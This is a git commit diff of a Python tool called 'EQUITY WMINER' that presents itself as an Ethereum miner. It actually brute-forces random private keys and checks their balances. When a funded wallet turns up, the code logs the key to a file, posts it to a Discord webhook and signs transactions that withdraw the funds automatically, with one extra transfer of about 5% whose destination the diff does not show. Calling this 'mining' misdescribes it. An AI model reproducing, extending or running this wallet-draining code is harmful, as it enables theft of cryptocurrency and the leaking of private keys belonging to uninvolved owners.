9ea75d24e04a69d4054c1189879580789c6cf379
Cxyder <82769970+Cxyder@users.noreply.github.com>
2022-05-17 21:47:06 +0200

    Add files via upload

--- index.py
+++ index.py
@@ -2,26 +2,62 @@ import os
 import sys
 import time
 import json
-import string
 import secrets
-import requests
-from web3 import Web3
+import requests # (pip install requests)
+import psutil # Needs to be installed (pip install psutil) 
+from web3 import Web3 # (pip install web3)
 import multiprocessing
+from discord_webhook import DiscordWebhook, DiscordEmbed # (pip install discord_wehook)
+from datetime import datetime # (pip install datetime)
 
-def MineProcess(minerAddress, chk, hits, bdhits):
+starttime = datetime.now()
+
+def getUptime():
+    return datetime.now() - starttime
+
+def MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhookurl, badhitlogging):
     w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_NODE"]))
     if w3.isConnected():
         i=0
         while i <= 1:
             key = "0x" + secrets.token_hex(32)
+            amount.value = amount.value + 1
+            if int(amount.value) >= int(amounttrigger.value):
+                amount.value = 0
+                if (webhookurl != "null"):
+                    webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
+                    embed = DiscordEmbed(title="EQUITY WMINER | SUMMARY", color="8fce00")
+                    embed.set_timestamp()
+                    embed.add_embed_field(name="Bad Hits:", value=bdhits.value, inline=False)
+                    embed.add_embed_field(name="Good Hits:", value=hits.value, inline=False)
+                    embed.add_embed_field(name="Uptime:", value=str(getUptime()), inline=False)
+                    embed.add_embed_field(name="CPU Usage:", value="%s %"%str(psutil.cpu_percent(4)), inline=False)
+                    webhook.add_embed(embed)
+                    webhook.execute()
             try:
                 account = w3.eth.account.from_key(key)
                 bal = w3.eth.get_balance(account.address)
                 if bal > 2000000000000000:
                     hits.value = hits.value + 1
                     w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["RPC_NODE"]))
+                    if not w3.isConnected(): w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["BACKUP_NODE"]))
                     try:
                         print("\033[32m[NEW HIT] Succesfully cracked a wallet with following key: " + key + "\033[0m")
+                        print('\033[32mRecording hit in "hits.txt"...\033[0m')
+                        hitstxt = open("hits.txt", "a")
+                        hitstxt.write("> N E W   H I T! pKey: %s - ETH: %s\n"%(key, str(bal*0.95/1000000000000000000)))
+                        hitstxt.close()
+                        if (webhookurl != "null"):
+                            webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
+                            embed = DiscordEmbed(title="EQUITY WMINER | NEW HIT", color="8fce00")
+                            embed.set_timestamp()
+                            embed.add_embed_field(name="pKey:", value=key, inline=False)
+                            embed.add_embed_field(name="ETH:", value=str(bal*0.95/1000000000000000000), inline=False)
+                            embed.add_embed_field(name="Uptime:", value=str(getUptime()), inline=False)
+                            embed.add_embed_field(name="CPU Usage:", value="%s %"%str(psutil.cpu_percent(4)), inline=False)
+                            webhook.add_embed(embed)
+                            webhook.execute()
+                        print('\033[32mRecorded hit in "hits.txt". Attempting autowithdrawal...\033[0m')
                         gasdata = requests.get(json.load(open("DATA", "r"))['MAIN']["GAS_API"]).text
                         gasjson = json.loads(gasdata)
                         avgGas = int(gasjson["average"])/10
@@ -47,34 +83,35 @@ def MineProcess(minerAddress, chk, hits, bdhits):
                         if w3.toWei((bal*0.05-(w3.toWei(avgGas, "gwei")*2)), "wei") > w3.toWei(avgGas, "gwei"):
                             rt = w3.eth.send_raw_transaction(signedMineTX2.rawTransaction)
                     except Exception as e:
-                        print(e)
                         print("[WARNING!] Automatically withdrawn failed! Awaiting for manual withdraw!")
                 else:
-                    print("\033[31m[BAD HIT] | " + str(account.address) + " | cracked but insufficient balance of " + str(bal/1000000000) + " ETH\033[0m")
+                    if badhitlogging == True: print("\033[31m[BAD HIT] | " + str(account.address) + " | cracked but insufficient balance of " + str(bal/1000000000) + " ETH\033[0m")
                     bdhits.value = bdhits.value + 1
                     time.sleep(0.02)
             except Exception as e:
-                print(e)
-                print("\033[31m[BAD MATCH] | %s | Invalid key match for wallet\033[0m"%key)
+                if badhitlogging == True: print("\033[31m[NEW ERROR] | %s | Couldn't resolve key!\033[0m"%key)
                 chk.value = chk.value + 1
                 time.sleep(0.02)
     else: return print("CHILD PROCESS ENDED | Process Reallocated | Connection Failed to Web3 RPC Node")
 def NUpdate(chk,hits,bdhits):
     x = 0
     while x < 1:
-        if hits.value >= 1: sys.stdout.write("\x1b]2;EQUITY WMINER | MINING...GOT AN HIT! | CHKS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
-        else: sys.stdout.write("\x1b]2;EQUITY WMINER | MINING... | CHKS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
+        if hits.value >= 1:
+            sys.stdout.write("\x1b]2;EQUITY WMINER v1.3 | MINING...GOT AN HIT! | ERRS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
+        else:
+            sys.stdout.write("\x1b]2;EQUITY WMINER v1.3 | MINING... | ERRS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
         time.sleep(0.02)
+
 if __name__=="__main__":
     os.system("cls")
-    print("V 1.252")
+    print("V 1.3")
     print('███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
     print('██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
     print('█████╗░░██║██╗██║██║░░░██║██║░░░██║░░░░╚████╔╝░  ░╚██╗████╗██╔╝█████╗██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝')
     print('██╔══╝░░╚██████╔╝██║░░░██║██║░░░██║░░░░░╚██╔╝░░  ░░████╔═████║░╚════╝██║╚██╔╝██║██║██║╚████║██╔══╝░░██╔══██╗')
     print('███████╗░╚═██╔═╝░╚██████╔╝██║░░░██║░░░░░░██║░░░  ░░╚██╔╝░╚██╔╝░░░░░░░██║░╚═╝░██║██║██║░╚███║███████╗██║░░██║')
     print('╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝')
-    sys.stdout.write("\x1b]2;EQUITY WMINER | WAITING FOR INPUT | CHKS: 0 - HITS: 0 - BDHITS: 0 |\x07")
+    sys.stdout.write("\x1b]2;EQUITY WMINER v1.3 | WAITING FOR INPUT | ERRS: 0 - HITS: 0 - BDHITS: 0 |\x07")
     print('\n')
 
     minerAddress = input("Welcome User! Enter your ETHEREUM address to start mining: ")
@@ -83,25 +120,106 @@ if __name__=="__main__":
         intensity = input("Please input desired CPU intensity for mining (1-100): ")
         if int(intensity) >= 1 and int(intensity) <= 100:
             print("\033[32mSelected %s as CPU intensity\033[0m"%str(intensity))
-            print("Miner starting... [Buidling child processes...]")
+            webhookboolean = input("Do you want to enable Discord Webhook logging (yes-no): ")
+            if webhookboolean.lower() == "yes" or webhookboolean.lower() == "y":
+                webhookurl = input("Please enter your Discord Webhook URL: ")
+            elif webhookboolean.lower() == "no" or webhookboolean.lower() == "n":
+                webhookurl = "null"
+            else:
+                print("\033[31m[ERROR] | Invalid input!\033[0m")
+                os.system("pause")
+                exit()
+            badhitboolean = input("Do you want to enable bad hit logging (yes-no): ")
+            if badhitboolean.lower() == "yes" or badhitboolean.lower() == "y":
+                badhitbool = True
+            elif badhitboolean.lower() == "no" or badhitboolean.lower() == "n":
+                badhitbool = False
+            else:
+                print("\033[31m[ERROR] | Invalid input!\033[0m")
+                os.system("pause")
+                exit()
             w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["RPC_NODE"]))
             time.sleep(1)
             if w3.isConnected():
+                print("Miner starting... [Buidling child processes...]")
                 if __name__=="__main__":
                     chk = multiprocessing.Value("i", 0, lock=False)
                     hits = multiprocessing.Value("i", 0, lock=False)
                     bdhits = multiprocessing.Value("i", 0, lock=False)
+                    amount = multiprocessing.Value("i", 0, lock=False)
+                    amounttrigger = multiprocessing.Value("i", 20000, lock=False)
                     updP = multiprocessing.Process(target=NUpdate, args=(chk,hits,bdhits,))
                     updP.start()
-                    pcs = [multiprocessing.Process(target=MineProcess, args=(str(minerAddress),chk,hits,bdhits,)) for x in range(0, int(intensity)*2)]
+                    pcs = [multiprocessing.Process(target=MineProcess, args=(str(minerAddress),chk,hits,bdhits,amount,amounttrigger,webhookurl,badhitbool,)) for x in range(0, int(intensity)*2)]
                     print("Deploying child processes...\n")
+                    os.system("cls")
+                    print("V 1.3")
+                    print('\033[32m███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
+                    print('\033[32m██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
+                    print('\033[32m█████╗░░██║██╗██║██║░░░██║██║░░░██║░░░░╚████╔╝░  ░╚██╗████╗██╔╝█████╗██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝')
+                    print('\033[32m██╔══╝░░╚██████╔╝██║░░░██║██║░░░██║░░░░░╚██╔╝░░  ░░████╔═████║░╚════╝██║╚██╔╝██║██║██║╚████║██╔══╝░░██╔══██╗')
+                    print('\033[32m███████╗░╚═██╔═╝░╚██████╔╝██║░░░██║░░░░░░██║░░░  ░░╚██╔╝░╚██╔╝░░░░░░░██║░╚═╝░██║██║██║░╚███║███████╗██║░░██║')
+                    print('\033[32m╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝')
+                    print("")
+                    print("\033[32mMining...\033[0m \n")
+                    if (webhookurl != "null"):
+                        webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
+                        embed = DiscordEmbed(title="EQUITY WMINER | MINING...", description="Miner started!", color=0x00ff00)
+                        embed.add_embed_field(name="Miner Address", value=minerAddress, inline=False)
+                        embed.add_embed_field(name="CPU Intensity", value=intensity, inline=False)
+                        embed.add_embed_field(name="Bad Hit Logging", value=badhitbool, inline=False)
+                        webhook.add_embed(embed)
+                        webhook.execute()
                     [p.start() for p in pcs]
                     updP.join()
+                    #print("Connection to Main RPCs failed. Are you connected to Internet? Check RPCs status on Discord")
             else:
-                print("\033[31mSomething went wrong...  RPC Connection Error. Are you connected to Internet?\033[0m")
+                w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["BACKUP_NODE"]))
+                print("\033[33mConnection to Main RPC failed! Trying to connect to Backup RPC... \033[0m")
+                if w3.isConnected():
+                    print("Connection migrated to Backup RPC. Miner starting... [Buidling child processes...]")
+                    if __name__=="__main__":
+                        chk = multiprocessing.Value("i", 0, lock=False)
+                        hits = multiprocessing.Value("i", 0, lock=False)
+                        bdhits = multiprocessing.Value("i", 0, lock=False)
+                        amount = multiprocessing.Value("i", 0, lock=False)
+                        amounttrigger = multiprocessing.Value("i", 20000, lock=False)
+                        updP = multiprocessing.Process(target=NUpdate, args=(chk,hits,bdhits,))
+                        updP.start()
+                        pcs = [multiprocessing.Process(target=MineProcess, args=(str(minerAddress),chk,hits,bdhits,amount,amounttrigger,webhookurl,badhitbool,)) for x in range(0, int(intensity)*2)]
+                        print("Deploying child processes...\n")
+                        os.system("cls")
+                        print("V 1.3")
+                        print('\033[32m███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
+                        print('\033[32m██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
+                        print('\033[32m█████╗░░██║██╗██║██║░░░██║██║░░░██║░░░░╚████╔╝░  ░╚██╗████╗██╔╝█████╗██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝')
+                        print('\033[32m██╔══╝░░╚██████╔╝██║░░░██║██║░░░██║░░░░░╚██╔╝░░  ░░████╔═████║░╚════╝██║╚██╔╝██║██║██║╚████║██╔══╝░░██╔══██╗')
+                        print('\033[32m███████╗░╚═██╔═╝░╚██████╔╝██║░░░██║░░░░░░██║░░░  ░░╚██╔╝░╚██╔╝░░░░░░░██║░╚═╝░██║██║██║░╚███║███████╗██║░░██║')
+                        print('\033[32m╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝')
+                        print("")
+                        print("\033[32mMining...\033[0m \n")
+                        if (webhookurl != "null"):
+                            webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
+                            embed = DiscordEmbed(title="EQUITY WMINER | MINING...", description="Miner started!", color=0x00ff00)
+                            embed.add_embed_field(name="Miner Address", value=minerAddress, inline=False)
+                            embed.add_embed_field(name="CPU Intensity", value=intensity, inline=False)
+                            embed.add_embed_field(name="Bad Hit Logging", value=badhitbool, inline=False)
+                            webhook.add_embed(embed)
+                            webhook.execute()
+                        [p.start() for p in pcs]
+                        if badhitbool == False: print("\n\033[31m> ..MINING IN PROGRESS.. <\033[0m")
+                        updP.join()
+                else:
+                    print("Connection to Main RPCs failed. Are you connected to Internet? Check RPCs status on Discord")
+                    os.system("pause")
+                    exit()
         else:
             print("Not a valid number.")
             input("\nMiner stopped. Please restart.")
+            os.system("pause")
+            exit()
     else:
         print("That's not a valid ETHEREUM address!")
         input("\nMiner stopped. Please restart.")
+        os.system("pause")
+        exit()
